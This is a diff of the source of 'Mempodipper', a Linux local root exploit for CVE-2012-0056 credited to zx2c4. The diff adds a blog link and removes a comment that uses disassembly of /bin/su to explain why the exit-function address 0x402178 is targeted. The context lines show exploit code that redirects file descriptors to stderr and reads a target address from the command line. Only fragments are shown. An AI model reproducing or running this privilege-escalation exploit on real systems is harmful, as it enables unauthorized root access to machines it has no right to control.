@@ -1,10 +1,15 @@
-/* THIS CODE IS PRIVATE, NOT MEANT TO BE SHARED. */
-
 /*
  * Mempodipper
+ * by zx2c4
+ * 
  * Linux Local Root Exploit
  * 
- * by zx2c4
+ * Rather than put my write up here, per usual, this time I've put it
+ * in a rather lengthy blog post: http://blog.zx2c4.com/749
+ * 
+ * Enjoy.
+ * 
+ * - zx2c4
  * Jan 21, 2012
  * 
  * CVE-2012-0056
@@ -147,29 +152,7 @@ int main(int argc, char **argv)
 		printf("[+] Assigning fd %d to stderr.\n", fd);
 		dup2(2, 6);
 		dup2(fd, 2);
-/*
-  Here is the asm from my /bin/su.
-  At this point it returns from looking for the user name.
-  It gets the error string here:
-  403677:       ba 05 00 00 00          mov    $0x5,%edx
-  40367c:       be ff 64 40 00          mov    $0x4064ff,%esi
-  403681:       31 ff                   xor    %edi,%edi
-  403683:       e8 e0 ed ff ff          callq  402468 <dcgettext@plt>
-  And then writes it to stderr:
-  403688:       48 8b 3d 59 51 20 00    mov    0x205159(%rip),%rdi        # 6087e8 <stderr>
-  40368f:       48 89 c2                mov    %rax,%rdx
-  403692:       b9 20 88 60 00          mov    $0x608820,%ecx
-  403697:       be 01 00 00 00          mov    $0x1,%esi
-  40369c:       31 c0                   xor    %eax,%eax
-  40369e:       e8 75 ea ff ff          callq  402118 <__fprintf_chk@plt>
-  Closes the log:
-  4036a3:       e8 f0 eb ff ff          callq  402298 <closelog@plt>
-  And then exits the program:
-  4036a8:       bf 01 00 00 00          mov    $0x1,%edi
-  4036ad:       e8 c6 ea ff ff          callq  402178 <exit@plt>
-  
-  We therefore want to use 0x402178, which is the exit function it calls.
-*/
+
 		unsigned long address;
 		if (argc > 2 && argv[1][0] == '-' && argv[1][1] == 'o')
 			address = strtoul(argv[2], NULL, 16);
